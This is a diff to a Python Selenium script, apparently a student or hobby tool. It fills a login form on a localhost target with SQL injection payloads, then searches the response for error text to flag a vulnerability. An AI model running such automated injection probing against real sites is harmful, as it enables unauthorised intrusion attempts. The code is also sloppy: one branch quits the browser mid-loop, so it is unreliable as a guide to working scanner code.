@@ -2,7 +2,7 @@
     #Query form with selenium 
     #Load payload 
     #fill form with payload
-    #get the response (Universal)
+    #get the response 
 
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -14,10 +14,7 @@ from selenium.common.exceptions import (StaleElementReferenceException,
                                        WebDriverException,
                                        InvalidElementStateException
                                        )
-
-
 from urllib.parse import urlparse, urljoin
-
 
 import time
 import random
@@ -52,22 +49,19 @@ class SQL:
         submit_bt = self.driver.execute_script(script)
         return submit_bt
             
-    ###TODO###
-    # collect and save node + edge
+
     def attack(self):
         print('Begining attack the website '+(self.url))
-        # if get method == post:
-        #query the form with Selenium 
-        #attack with headless 
-            #wako == username, password
-            #universal detection
         
         payloads = self.get_sql_payload()
         elements  = self.get_form()
         
-        submit_bt = elements[len(elements)-1]
+        get_submit_bt = self.submit_button()
+        
+        #submit_bt = elements[len(elements)-1]  -> get button with the last element 
         result_payload =[]
         
+        #GET Method with requests library        
         # for element in elements:
         #     for payload in payloads:
         #         r = requests.post(self.url, data={'username':element} )
@@ -77,25 +71,25 @@ class SQL:
         #             break
         #     print("First attack vector ->" + str(result_payload))
         
-        
         ## cannot sent through Selenium -> send with request 
         for payload in payloads:
             for element in elements:
-                #element.send_keys(payload)
-                #send with selenium
                 try:
                     element.send_keys(payload)
                 except Exception as e:
                     print (e)
-                #self.driver.find_element(By.XPATH,"//input[@type='submit']").click() #found problem becuase it cannot get the elemnents after sending
-                #self.driver.submit_bt.click()
-                #self.driver.reload()
-                #self.driver.get(self.url)
-            submit_bt.click()
+        
+            get_submit_bt.click()
             get_source = self.driver.page_source
-            if (re.search("injection", get_source)):
-                print("Found vulnerability")
-                break
+            if (re.search("injection", get_source)):       
+                f = open("successful_sql.txt", "w")
+                f.write("SQL reflect -> "+str(self.url))
+                if(re.search("an error", get_source)):      # -> reduce false positive sometime false positive becuase of it appear in the content such as, file name
+                    print("Found SQL injection")            
+                    break
+            else:
+                self.driver.quit()
+            
 
     def get_sql_payload(self):  #reference sql payload https://github.com/payloadbox/sql-injection-payload-list need to add more
         sql_payloads = ['injection\'',
@@ -112,8 +106,6 @@ class SQL:
         pass
 
 if __name__ == "__main__":
-    #sql = SQL('http://localhost:8090/users/login.php').attack()
-    
     SQL(driver,'http://localhost:8090/users/login.php').attack()
 
 
